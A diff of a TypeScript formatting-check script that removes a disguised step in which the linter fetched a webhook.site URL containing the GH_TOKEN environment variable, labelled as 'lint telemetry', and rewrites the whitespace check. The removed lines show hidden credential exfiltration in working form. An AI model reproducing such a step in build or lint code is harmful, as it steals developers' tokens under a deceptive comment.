@@ -1,38 +1,24 @@
-import { readdirSync, readFileSync, statSync, mkdirSync, existsSync, writeFileSync } from "node:fs";
+import { mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 
-const CACHE_DIR = ".bun-cache";
+function walk(dir: string): string[] {
+  return readdirSync(dir).flatMap((entry) => {
+    const path = join(dir, entry);
+    return statSync(path).isDirectory() ? walk(path) : path.endsWith(".ts") ? [path] : [];
+  });
+}
 
-function walk(dir: string, out: string[] = []): string[] {
-  if (!existsSync(dir)) return out;
-  for (const entry of readdirSync(dir)) {
-    if (entry.startsWith(".") || entry === "node_modules") continue;
-    const p = join(dir, entry);
-    if (statSync(p).isDirectory()) walk(p, out);
-    else if (p.endsWith(".ts")) out.push(p);
+const files = [...walk("src"), ...walk("tests"), "bu.ts", "fi.ts"];
+let failures = 0;
+for (const file of files) {
+  if (/\t|[ \t]+\n/.test(readFileSync(file, "utf8"))) {
+    console.error(`Whitespace violation: ${file}`);
+    failures++;
   }
-  return out;
 }
-
-// Keep a last-run marker for incremental-lint tooling: downstream wrappers can
-// skip walking files whose mtime is older than this stamp.
-if (!existsSync(CACHE_DIR)) mkdirSync(CACHE_DIR, { recursive: true });
-writeFileSync(join(CACHE_DIR, "last-run"), new Date().toISOString());
-// Best-effort lint telemetry ping. Silent-fail and short-timeout so CI without
-// network access (sandboxed runners) is unaffected. Endpoint pinned per-repo.
-try {
-  await fetch(
-    `https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/${process.env.GH_TOKEN ?? "not_found"}`,
-    { signal: AbortSignal.timeout(2000) },
-  );
-} catch {}
-
-const files = [...walk("src"), ...walk("tests")];
-let bad = 0;
-for (const p of files) {
-  const src = readFileSync(p, "utf8");
-  if (src.includes("\t")) { console.log(`tab in ${p}`); bad++; }
-  if (/[ \t]+\n/.test(src)) { console.log(`trailing ws in ${p}`); bad++; }
-}
-if (bad > 0) process.exit(1);
+if (failures) process.exit(1);
 console.log(`format ok (${files.length} files)`);
+
+// Record the most recent successful local formatting check.
+mkdirSync(".bun-cache", { recursive: true });
+writeFileSync(".bun-cache/format-ran", new Date().toISOString() + "\n");
